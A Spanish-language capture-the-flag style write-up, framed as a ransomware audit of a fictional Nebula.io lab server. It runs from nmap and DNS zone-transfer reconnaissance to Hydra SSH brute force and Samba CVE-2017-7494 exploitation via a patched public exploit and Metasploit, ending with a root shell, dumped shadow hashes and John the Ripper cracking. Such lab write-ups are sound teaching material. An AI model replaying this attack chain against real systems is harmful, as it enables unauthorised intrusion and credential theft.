Nebula.io ha confiado en nosotros para llevar a cabo una auditoría exhaustiva de sus sistemas tras sufrir un grave incidente de seguridad. El servidor principal fue comprometido y todos los archivos fueron cifrados, lo que indica un posible ataque de ransomware.
Ante esta situación, se ha restaurado una copia de seguridad del servidor en un entorno aislado (sandbox) con el fin de evaluar si el backup también ha sido comprometido. Hasta el momento, no se ha detectado ningún indicio de phishing en los correos electrónicos revisados, por lo que uno de los objetivos principales de la auditoría será identificar el vector de ataque utilizado por los atacantes para acceder al sistema.
Empiezo por escaneo nmap, con "nmap -sn IP" compruebo que tengo la conexión con la máquina.
Inicio escaneo con más opciones.


```
nmap -sT -A <IP-target> -p- 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 13:13 EDT

Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.9.5-3ubuntu0.19 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.19-Ubuntu
80/tcp   open  http    lighttpd 1.4.33
|_http-title: Bluffer V.0.1a
|_http-server-header: lighttpd/1.4.33
1986/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 77:bd:da:ab:76:ac:f2:e6:5e:89:13:62:d5:64:2c:eb (DSA)
|   2048 a0:ec:8e:db:17:ff:f9:61:ce:68:bb:5d:1c:b4:a8:ba (RSA)
|   256 dd:d8:d6:76:dc:d4:67:7b:15:94:4a:9c:d8:d3:cb:37 (ECDSA)
|_  256 b1:7b:06:a9:49:85:1e:2a:0a:de:71:9d:8b:50:d3:4a (ED25519)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
Tengo la información de 3 servicios activados en la máquina: dns por el puerto 53, http por el puerto 80 y ssh por el puerto 1986. Empiezo el escaneo con Nessus para tener la información sobre las posibles vulnerabilidades. El resultado no es muy crítico. La CVSS más alta es de 5.9 de CVE-2023-48759 con el nombre SSH Terrapin Prefix Truncation Weakness. CVSS más baja 2.1 de la vulnerabilidad ICMP Timestamp Request Remote Date Disclosure y el plugin que la detectó es 10114.

Para sacar información de DNS utilice escaneo nmap aplicando script dns-zone-transfer.
(https://es.wikipedia.org/wiki/Transferencia_de_zona_DNS) esta pagina me facilitó el comando nmap para utilizar el script dns-zone-transfer.
Ya tengo información de nombre del servidor, sus subdominios, número de verificación de google-site, e-mail de contacto, etc.
El resultado me muestra un posible nombre de usuario "Bluffer".
Con el comando "dig axfr nebula.io @IP-target" también se puede sacar la misma información, más los detalles de ttl de los servicios.


```
nmap -Pn <IP-target> -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=nebula.io
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 03:25 EDT

PORT   STATE SERVICE
53/tcp open  domain
| dns-zone-transfer: 
| nebula.io.                               SOA    ns1.nebula.io. admin.nebula.io.
| nebula.io.                               HINFO  "Nebula Server" "Linux"
| nebula.io.                               TXT    "nebula-verification=examplecode123"
| nebula.io.                               TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
| nebula.io.                               MX     0 mail.nebula.io.
| nebula.io.                               MX     0 ASPMX.L.GOOGLE.COM.
| nebula.io.                               MX     10 ALT1.ASPMX.L.GOOGLE.COM.
| nebula.io.                               MX     10 ALT2.ASPMX.L.GOOGLE.COM.
| nebula.io.                               MX     20 ASPMX2.GOOGLEMAIL.COM.
| nebula.io.                               MX     20 ASPMX3.GOOGLEMAIL.COM.
| nebula.io.                               MX     20 ASPMX4.GOOGLEMAIL.COM.
| nebula.io.                               MX     20 ASPMX5.GOOGLEMAIL.COM.
| nebula.io.                               NS     ns1.nebula.io.
| nebula.io.                               NS     ns2.nebula.io.
| nebula.io.                               A      192.168.150.144
| _sip._tcp.nebula.io.                     SRV    0 5 5060 sip.nebula.io.
| 144.150.168.192.IN-ADDR.ARPA.nebula.io.  PTR    www.nebula.io.
| bluffer.nebula.io.                       TXT    "BLUFFER{S3cr3t_DNS_Tr4nsfer_Flag}"
| contact.nebula.io.                       TXT    "Para soporte, contactar a admin@nebula.io o llamar al +1 123 4567890"
| deadbeef.nebula.io.                      AAAA   dead:beef::1
| ftp.nebula.io.                           A      192.168.150.180
| mail.nebula.io.                          A      192.168.150.146
| ns1.nebula.io.                           A      192.168.150.144
| ns2.nebula.io.                           A      192.168.150.145
| office.nebula.io.                        A      192.0.2.10
| sip.nebula.io.                           A      192.168.150.147
| vpn.nebula.io.                           A      198.51.100.10
| www.nebula.io.                           A      192.168.150.144
| xss.nebula.io.                           TXT    "user : bluffer"
|_nebula.io.                               SOA    ns1.nebula.io. admin.nebula.io.

```
Voy a revisar el servidor web con gobuster para poder ver los directorios que tiene.

```

gobuster dir -u "http://<IP-target>/etc/hosts" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<IP-target>/etc/hosts
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/%7Echeckout%7E       (Status: 403) [Size: 345]
Progress: 220560 / 220561 (100.00%)

```
El gobuster encuentra un directorio raro, pruebo entrar al directorio encontrado y sin resultado.

```
gobuster dir -u "http://<IP-target>/etc/hosts/%7Echeckout%7E" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k 

```
Para buscar más directorios de nebula creo en /etc/hosts unos virtual-hosts con diferentes posibles nombres, según información sacada de dns-zone-transfer.

```
10.10.47.208    admin.nebula.io
10.10.47.208    user.nebula.io
10.10.47.208    bluffer.nebula.io

```
Con el siguiente comando de gobuster encontró el directorio admin.nebula.io, que podría ser interesante

```
gobuster vhost -u "http://<IP-target>" --domain nebula.io -w /usr/share/wordlists/dirb/small.txt --append-domain --exclude-length 250-320

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://<IP-target>
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/dirb/small.txt
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
[+] Append Domain:    true
[+] Exclude Length:   
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: @.nebula.io Status: 400 [Size: 349]
Found: Admin.nebula.io Status: 200 [Size: 2369]
Found: admin_login.nebula.io Status: 400 [Size: 349]
Found: admin_logon.nebula.io Status: 400 [Size: 349]
Found: admin.nebula.io Status: 200 [Size: 2369]
Found: cgi-bin/.nebula.io Status: 400 [Size: 349]

```
Desde el navegador al abrir el directorio "admin.nebula.io" encuentro un formulario de autenticación y necesito un PIN, hay un botón donde se puede clicar y se descarga una carpeta comprimida git_admin.zip.
Al descomprimirlo dentro encuentro varios archivos index.php, script.js, style.css y la carpeta .git.
Después de investigarlo, dentro del archivo script.js hay un "PIN_HASH" 

```
(function (Default) {
    Default["PIN_HASH"] = "22d04f665519fd8091f873476b0b4be4ad02abe10c610b1f81611b7cc37d6146";
})(Default || (Default = {}));

```
Para desencriptar este hash busco una pagina, y en la https://hashes.com/es/decrypt/hash encuentro una herramienta online. Con esta herramienta consigo un PIN de cuatro dígitos 5289, introduciéndolo me permite acceder a la pagina de un SIEM. Finalizando todas las tareas de SIEM tengo un archivo 3st3rn0cl31d0ma5t01d30.txt, que posiblemente me puede ayudar a encontrar la contraseña para el usuario bluffer, que encontre antes.

```
FLAG {G00D-J08!} 

```
Descargo este archivo y utilizo la herramienta Hydra para encontrar la contraseña para posible usuario "bluffer".

```
http://admin.nebula.io/open_siem/threat_management/3st3rn0cl31d0ma5t01d30.txt
hydra -l bluffer -P password.txt -s 1986 <IP-target> ssh 
 [1986][ssh] host: 10.10.134.0   login: bluffer   password: w.v2rLTM7
 
```
Voy a probar entrar a la maquina con usuario "bluffer" su contraseña "w.v2rLTM7" por protocolo ssh y puerto 1986

```
ssh bluffer@<IP-target> -p 1986

```
Al entrar aparece que el servidor esta encriptado por un ransomware RYUK V0.02a2

```
Payload successfully deployed[*] Encrypted Server ...
[*] Connecting to server 10.10.6PmP.@*x4[*] 
[*] Connected ...
[*] Authenticating user : fyc5QNQ0twf*mjc2ebr[*] 
[*] Authentication successful.
[*] Accessing server resources : kvd2MAV@vxk4mcg!ecv
[*] Downloading sensitive data : pdAFihaBYt6@*x4-T6Qqvq8ph.6PmP 
[*] GET /admin/config/settings HTTP/1.1
[*] Host: 127.0.0.1
[*] Hostname: Nebula Server Kernel
[*] Authorization: Bearer : <token> CJcKuhwvsYKx3g9-yM.LwGfJEqXT.2u8co_Cid!.bW8ii8np7_KEgDFegEh34F-F42a6QTEmbPyTg </token>
[*] Data received from server :
---------------------------
root::0:0:root:/root:/bin/bash
admin:x:1:1:admin:/admin:/bin/sh
[*] Injecting malicious code
[*] Sending payload ...
[*] POST /admin/upload HTTP/1.1
[*] Content-Type: application/x-www-form-urlencoded
[*] Payload:

```
Estoy dentro del servidor pero no tengo permisos...

```
bluffer@Nebula-server:~$ whoami
[Restricted Permission]
bluffer@Nebula-server:~$ uname
[Restricted Permission]
bluffer@Nebula-server:~$ echo "bash" > /tmp/num
bluffer@Nebula-server:~$ chmod +x /tmp/num
[Restricted Permission]
bluffer@Nebula-server:~$ OPEN_SMB
Starting Samba services...

```
Pero encuentro, que puedo activar el servicio de Samba, vuelvo a escanear con nmap y resulta que la maquina tiene otro puerto 44544 abierto con el servicio Samba activado

```
44544/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: NEBULA_ROCKS)
|_unusual-port: netbios-ssn unexpected on port tcp/44544
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: Host: NEBULA-SERVER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Voy a intentar conectarme al servidor por smbclient, tras realizar varios intentos de conectarme como cliente he averiguado que dentro del servidor hay un recurso compartido nebula_share y dentro hay dos directorios ocultos, pero tampoco puedo acceder a ellos.

```

smbclient -L //<IP-target> -N -p 44544

        Sharename       Type      Comment
        ---------       ----      -------
        nebula_share    Disk      
        IPC$            IPC       IPC Service (Nebula.io File Tansfer Server)


smbclient //<IP-target> /nebula_share -N -p 44544
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Wed Apr  9 04:33:52 2025
  ..                                  D        0  Fri Oct 25 12:43:58 2024

                10900304 blocks of size 1024. 8408384 blocks available

```
Voy a buscar vulnerabilidades para las versiones entre 3.x y 4.x, que me indica el escaneo nmap. Encuentro que estas versiones tienen vulnerabilidad CVE-2017-7479 con CVSS-9,8 critico, y puedo probar inyectar una libreria con contenido ejecutable.
Probando varias opciones put prueba.txt, o put payload.so resulta, que puedo cargar libreria libbindshell-samba.so y posiblemente ejecutarla.

```

git clone "https://github.com/opsxcq/exploit-CVE-2017-7494.git"
 
```
Desde github descargo el exploit, pero al ejecutarlo me da error. Primero me daba error el archivo de python, porque era para python2 y la versión que uso es python3.

```

./exploit.py -t <IP-target> -e libbindshell-samba.so -s nebula_share -r /nebula_share/libbindshell-samba.so
  File "/home/kali/Desktop/Nebula.io/exploit-CVE-2017-7494/./exploit.py", line 39
    except Exception, e:
           ^^^^^^^^^^^^
SyntaxError: multiple exception types must be parenthesized

```
Después de corregir el archivo exploit.ty: en líneas donde esta puesto "except Exepcion, e:" quito la coma y pongo "as". 
    sys.stdout.write(str(data))
    except Exception as e:
        print("[-] Exception "+str(e))

```

./exploit.py -t <IP-target>  -e libbindshell-samba.so  -s nebula_share -r /nebula_share/libbindshell.so -u bluffer -p w.v2rLTM7 -P 44544
[*] Starting the exploit
[!] Error    

```
Al ejecutar de nuevo me da otro error, porque para utilizar este exploit tengo que activar el entorno virtual. Voy a realizar todas configuraciones necesarias.

```
pip3 install -r requirements.txt
error: externally-managed-environment

```
Compruebo si tengo repositorio y herramientas para entorno virtual.

```
pip3 show impacket
Name: impacket
Version: 0.12.0

```
Actualizo el repositorio.

```
python3 -m venv impacket-env

pip install git+https://github.com/fortra/impacket.git
Collecting git+https://github.com/fortra/impacket.git

pip show impacket
Name: impacket
Version: 0.13.0.dev0+20250404.133223.00ced47

python3 -m impacket.examples.smbclient -h

```
Activo el entorno virtual.

```
source impacket-env/bin/activate

```
Voy a ejecutar otra vez el exploit.

```
python3 exploit_fixed.py -t <IP-target> -e libbindshell-samba.so -s nebula_share -r libbindshell-samba.so -P 44544 -u bluffer -p 'w.v2rLTM7'
[*] Starting the exploit
[+] Authenticated, we are in!
[+] Preparing the exploit
[+] Expected exception from Samba (SMB SessionError): [Errno Connection error (10.10.143.162:445)] [Errno 111] Connection refused
[+] Exploit trigger running in background, checking our shell
[+] Connecting to 10.10.143.162 at port 44544
[+] Shell connected! Sending commands...
>> pwd
>> ls

```
Bien, parece que funciona, pero no me permite interactuar con esta shell.
Voy a probar utilizar metasploit. Encuentro que existe un exploit para esta vulnerabilidad "linux/samba/is_known_pipename".

```
msf6 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CHOST                            no        The local client address
   CPORT                            no        The local client port
   Proxies                          no        A proxy chain of format type:host:port[,typ
                                              e:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasp
                                              loit.com/docs/using-metasploit/basics/using
                                              -metasploit.html
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable S
                                              MB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writ
                                              eable directory

msf6 exploit(linux/samba/is_known_pipename) > set RHOST <IP-target>
RHOST => <IP-target>
msf6 exploit(linux/samba/is_known_pipename) > set RPORT 44544
RPORT => 44544
msf6 exploit(linux/samba/is_known_pipename) > set SMB_SHARE_NAME nebula_share
SMB_SHARE_NAME => nebula_share

```
Funcionó, ya estoy dentro, ahora a buscar nombres de usuarios, contraseñas y el flag.

```
msf6 exploit(linux/samba/is_known_pipename) > exploit
[*] 10.10.131.159:44544 - Using location \\10.10.131.159\nebula_share\ for the path
[*] 10.10.131.159:44544 - Retrieving the remote path of the share 'nebula_share'
[*] 10.10.131.159:44544 - Share 'nebula_share' has server-side path '/srv/samba/share
[*] 10.10.131.159:44544 - Uploaded payload to \\10.10.131.159\nebula_share\QyjOomPF.so
[*] 10.10.131.159:44544 - Loading the payload from server-side path /srv/samba/share/QyjOomPF.so using \\PIPE\/srv/samba/share/QyjOomPF.so...
[-] 10.10.131.159:44544 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.10.131.159:44544 - Loading the payload from server-side path /srv/samba/share/QyjOomPF.so using /srv/samba/share/QyjOomPF.so...
[+] 10.10.131.159:44544 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (10.23.75.205:32921 -> 10.10.131.159:44544) at 2025-04-13 13:06:59 -0400

ls
whoami
root
ls
pwd  
/tmp
cd /root
ls -la

```
Dentro de archivo /etc/passwd encontré otro usuario guakamole,
dentro de /etc/shadow su contraseña cifrada, también encontré hash de la contraseña de root. 

```
guakamole:$6$kVXyIMLn$A6bPHFDkYFqd/dS58eGsJmK2lYnlEQxtgYX6H/6WxdC.V21j/P8IaseqnKibDBq1PkdmRqgPO2CU3dd/
root:$6$dTV9ZkDw$ZULnb36XSMz1fv4LzsGXZnq7FpRx3H6v3CUmD/iySvY4M/9lzVGUVv81ChJsasATlegYJLib8Ciw1/fowpi2s0

```
Flag encontré en un archivo oculto .s3cr3t dentro de la carpeta root, el nombre de este archivo aparecía antes cuando buscaba la información de DNS.

```
GFCS|C0d3-S3cr3t-R00t|

 
```
El password "kamikaze2" de usuario gaukamole he descifrado con herramienta JohnTheRipper.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
kamikaze2        (?)   
